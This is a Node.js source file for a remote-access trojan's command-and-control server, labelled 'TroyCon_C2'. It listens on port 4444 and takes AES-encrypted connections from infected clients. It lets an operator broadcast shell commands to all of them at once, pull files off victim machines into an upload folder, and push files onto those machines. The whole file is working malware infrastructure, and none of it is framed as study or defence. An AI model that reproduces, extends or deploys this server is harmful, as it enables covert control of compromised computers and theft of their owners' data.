const net = require('net');
const readline = require('readline');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

// --- Server Configuration ---
const HOST = '0.0.0.0';
const PORT = 4444;

// --- Encryption Key Configuration ---
// TODO: Connect using the ECDH algorithm
const AES_KEY = Buffer.from('Hexadecimal_format_aes_key', 'hex');

if (AES_KEY.length !== 32) {
    console.error(`[!] Error: AES_KEY must be exactly 32 bytes (256 bits) long. Current length: ${AES_KEY.length}`);
    process.exit(1);
}

// --- File Storage Directory Configuration ---
const UPLOAD_DIR = path.join(__dirname, 'client_uploads');

if (!fs.existsSync(UPLOAD_DIR)) {
    fs.mkdirSync(UPLOAD_DIR, { recursive: true });
    console.log(`[Config] Directory created successfully: ${UPLOAD_DIR}`);
}

// --- Client Management and Server Logic ---
const clients = new Map();
const incomingFileStates = new Map();
const clientBuffers = new Map();

// --- Encryption and Decryption Functions ---
function encrypt(data) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', AES_KEY, iv);
    let encrypted = cipher.update(data);
    encrypted = Buffer.concat([encrypted, cipher.final()]);
    return Buffer.concat([iv, encrypted]);
}

function decrypt(data) {
    const iv = data.slice(0, 16);
    const ciphertext = data.slice(16);

    try {
        const decipher = crypto.createDecipheriv('aes-256-cbc', AES_KEY, iv);
        let decrypted = decipher.update(ciphertext);
        decrypted = Buffer.concat([decrypted, decipher.final()]);
        return decrypted;
    } catch (e) {
        console.error(`[!] Error occurred during decryption: ${e.message}. (IV: ${iv.toString('hex')}, Ciphertext: ${ciphertext.toString('hex').substring(0, 100)}...)`);
        throw e;
    }
}

function sendPacket(socket, payload) {
    try {
        const encryptedPayload = encrypt(payload);
        const lengthPrefix = Buffer.alloc(4);
        lengthPrefix.writeUInt32BE(encryptedPayload.length, 0);
        socket.write(Buffer.concat([lengthPrefix, encryptedPayload]));
    } catch (e) {
        console.error(`[!] Send Error: ${e.message}`);
    }
}

const server = net.createServer(socket => {
    const addr = `${socket.remoteAddress}:${socket.remotePort}`;
    clients.set(addr, socket);
    clientBuffers.set(addr, { buffer: Buffer.alloc(0), expectedLength: 0 });
    console.log(`[+] Client connected: ${addr}`);

    socket.on('data', data => {
        const clientBufState = clientBuffers.get(addr);
        clientBufState.buffer = Buffer.concat([clientBufState.buffer, data]);

        while (true) {
            // 1. Read message length prefix
            if (clientBufState.expectedLength === 0) {
                if (clientBufState.buffer.length >= 4) {
                    clientBufState.expectedLength = clientBufState.buffer.readUInt32BE(0);
                    clientBufState.buffer = clientBufState.buffer.slice(4);
                } else {
                    break; // Incomplete length prefix
                }
            }

            // 2. Read actual message body
            if (clientBufState.buffer.length >= clientBufState.expectedLength) {
                const messageBuffer = clientBufState.buffer.slice(0, clientBufState.expectedLength);
                clientBufState.buffer = clientBufState.buffer.slice(clientBufState.expectedLength);
                clientBufState.expectedLength = 0; // Reset length for the next message

                try {
                    const decryptedData = decrypt(messageBuffer);

                    let dataStrPeek = "";
                    try {
                        dataStrPeek = decryptedData.toString('utf8', 0, Math.min(decryptedData.length, 100));
                    } catch (strErr) {
                        console.error(`(Server): [${addr}] UTF-8 conversion error: ${strErr.message}`);
                    }
                    console.log(`(Server): [${addr}] Decrypted data (total length): ${decryptedData.length} bytes`);


                    // --- Process file content if currently in file reception state (Phase 2) ---
                    if (incomingFileStates.has(addr)) {
                        let fileState = incomingFileStates.get(addr);
                        // decryptedData contains the actual file content, so we use it directly.
                        // Since fileState.receivedBytes was previously initialized with Buffer.alloc(0),
                        // the first file content message will fill receivedBytes.
                        fileState.receivedBytes = Buffer.concat([fileState.receivedBytes, decryptedData]);

                        console.log(`[${addr}] Receiving file data: ${fileState.receivedBytes.length}/${fileState.expectedLength} bytes (based on original file size)`);

                        if (fileState.receivedBytes.length >= fileState.expectedLength) {
                            // At this point, fileState.receivedBytes length should exactly match fileState.expectedLength.
                            // If it exceeds, the extra data is trimmed.
                            const fileContent = fileState.receivedBytes.slice(0, fileState.expectedLength);
                            const filename = fileState.filename;
                            const savePath = path.join(UPLOAD_DIR, `${addr.replace(/:/g, '_')}_${filename}`);

                            fs.writeFile(savePath, fileContent, err => {
                                if (err) {
                                    console.error(`[!] ${addr} File save error (${filename}): ${err.message}`);
                                    sendResponse(socket, `SERVER_RESPONSE:UPLOAD_ERROR:${err.message}`);
                                } else {
                                    console.log(`[${addr}] File '${filename}' received and saved successfully: ${savePath} (${fileContent.length} B)`);
                                    sendResponse(socket, `SERVER_RESPONSE:UPLOAD_SUCCESS:${filename}`);
                                }
                                incomingFileStates.delete(addr); // Reset file transfer state
                            });
                        }
                    } else {
                        // --- Process general commands or file headers (Phase 1) ---
                        if (dataStrPeek.startsWith('FILE_UPLOAD_HEADER:')) {
                            const fullHeaderStr = decryptedData.toString('utf8');
                            console.log(`(Server): [${addr}] Full received header string: '${fullHeaderStr}'`);

                            const parts = fullHeaderStr.split(':', 3);

                            if (parts.length < 3) {
                                console.error(`[!] ${addr} Header parsing error: Expected format 'FILE_UPLOAD_HEADER:path:length' not met. Received parts:`, parts);
                                return;
                            }

                            const base64EncodedPath = parts[1];
                            try {
                                const originalPathBuffer = Buffer.from(base64EncodedPath, 'base64');
                                const originalPath = originalPathBuffer.toString('utf8');

                                const fileLength = parseInt(parts[2], 10);
                                const filename = path.basename(originalPath);


                                if (isNaN(fileLength)) {
                                    console.error(`[!] ${addr} File length parsing error: '${parts[2]}' is not a valid number.`);
                                    return;
                                }

                                incomingFileStates.set(addr, {
                                    expectedLength: fileLength,
                                    receivedBytes: Buffer.alloc(0),
                                    filename: filename
                                });
                                console.log(`[${addr}] File upload header received: '${filename}', expected original size: ${fileLength} bytes. Waiting for file content...`);
                            } catch (e) {
                                console.error(`[!] ${addr} Base64 decoding error or UTF-8 conversion error: ${e.message}`);
                                return;
                            }
                        } else if (dataStrPeek.startsWith('CHECK_IN:')) {
                            const clientInfo = decryptedData.toString('utf8').substring('CHECK_IN:'.length);
                            console.log(`[${addr}] Client check-in: ${clientInfo}`);
                        } else {
                            console.log(`[${addr}] Command execution result:\n${decryptedData.toString('utf8')}`);
                        }
                    }
                } catch (e) {
                    console.error(`[!] ${addr} Data decryption or processing error: ${e.message}. Problematic message (HEX, first 100 chars): ${messageBuffer.toString('hex').substring(0, 100)}...`);
                    clientBufState.expectedLength = 0; // Reset length to prepare for the next message in case of an error
                }
            } else {
                break;
            }
        }
    });

    socket.on('close', () => {
        console.log(`[-] Client disconnected: ${addr}`);
        clients.delete(addr);
        incomingFileStates.delete(addr);
        clientBuffers.delete(addr);
    });

    socket.on('error', err => {
        console.log(`[!] Error occurred: ${addr} - ${err.message}`);
    });
});

// Helper function to send encrypted responses with length prefix
function sendResponse(socket, message) {
    const encryptedPayload = encrypt(Buffer.from(message, 'utf8'));
    const lengthPrefix = Buffer.alloc(4);
    lengthPrefix.writeUInt32BE(encryptedPayload.length, 0);
    socket.write(Buffer.concat([lengthPrefix, encryptedPayload]));
}


server.listen(PORT, HOST, () => {
    console.log(`Server running at: ${HOST}:${PORT}`);
    console.log(`C2 server awaiting encryption/decryption with client's AES key...`);
    console.log(`File upload save directory: ${UPLOAD_DIR}`);
});

// --- Create interface for terminal input (command control) ---
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: 'TroyCon_C2> '
});

rl.prompt();

rl.on('line', async line => {
    const parts = line.trim().split(' ');

    if (parts.length < 2) {
        console.log('Usage: <IP:Port|all> <command>');
        console.log('Currently connected clients:', Array.from(clients.keys()));
        rl.prompt();
        return;
    }

    const target = parts[0];
    const commandType = parts[1] ? parts[1].toUpperCase() : '';
    const cmdArgs = parts.slice(2).join(' ');

    // if you want to target a specific client
    // const clientSocket = clients.get(target);

    // if (!clientSocket) {
    //     console.log('Specified client not found. Currently connected clients:', Array.from(clients.keys()));
    //     rl.prompt();
    //     return;
    // }

    let payloadToSend;

    if (commandType === 'GET_FILE') {
        const filePathOnClient = cmdArgs;
        if (!filePathOnClient) {
            console.log('The GET_FILE command requires specifying the file path within the client. Example: [client_address] GET_FILE /path/to/file.txt');
            rl.prompt();
            return;
        }
        payloadToSend = Buffer.from(`GET_FILE:${filePathOnClient}`, 'utf8');
        console.log(`Sending file request command to [${target}]: '${filePathOnClient}'`);
    } else if (commandType === 'PUT_FILE') {
        const localFilePath = parts[2];
        const remoteFilePath = parts[3] || path.basename(localFilePath);

        if (!fs.existsSync(localFilePath) || !fs.statSync(localFilePath).isFile()) {
            console.log(`[!] Local file '${localFilePath}' not found or is not a file.`);
            rl.prompt();
            return;
        }

        try {
            const fileContent = fs.readFileSync(localFilePath);
            const actualRemotePathForClient = remoteFilePath || path.basename(localFilePath);
            const encodedRemotePath = Buffer.from(actualRemotePathForClient, 'utf8').toString('base64');

            payloadToSend = Buffer.concat([
                Buffer.from(`PUT_FILE:${encodedRemotePath}:${fileContent.length}:`, 'utf8'),
                fileContent
            ]);
            console.log(`Sending file transfer command to [${target}]: '${localFilePath}' -> '${remoteFilePath}' (${fileContent.length} B)`);
        } catch (e) {
            console.error(`[!] Local file read error: ${e.message}`);
            rl.prompt();
            return;
        }
    } else {
        const commandText = `${commandType} ${cmdArgs}`.trim();
        if (!commandText) {
            console.log('Invalid command format. Example: [client_address] command');
            rl.prompt();
            return;
        }
        payloadToSend = Buffer.from(commandText, 'utf8');
        console.log(`Sending general command to [${target}]: "${commandText}"`);
    }

    if (target.toUpperCase() === 'ALL') {
        if (clients.size === 0) console.log("[!] No clients.");
        else {
            let count = 0;
            for (const socket of clients.values()) {
                sendPacket(socket, payloadToSend);
                count++;
            }
            console.log(`[+] Broadcasted to ${count} clients.`);
        }
    } else {
        const socket = clients.get(target);
        if (!socket) {
            console.log(`[!] Client '${target}' not found. Available:`, Array.from(clients.keys()));
        } else {
            sendPacket(socket, payloadToSend);
            console.log(`[+] Sent to ${target}`);
        }
    }

    // if you want to target a specific client
    // try {
    //     const encryptedPayload = encrypt(payloadToSend);
    //     const lengthPrefix = Buffer.alloc(4);
    //     lengthPrefix.writeUInt32BE(encryptedPayload.length, 0);
    //     clientSocket.write(Buffer.concat([lengthPrefix, encryptedPayload]));

    // } catch (e) {
    //     console.error(`[!] Encryption or transmission error: ${e.message}`);
    // }
    
    rl.prompt();
});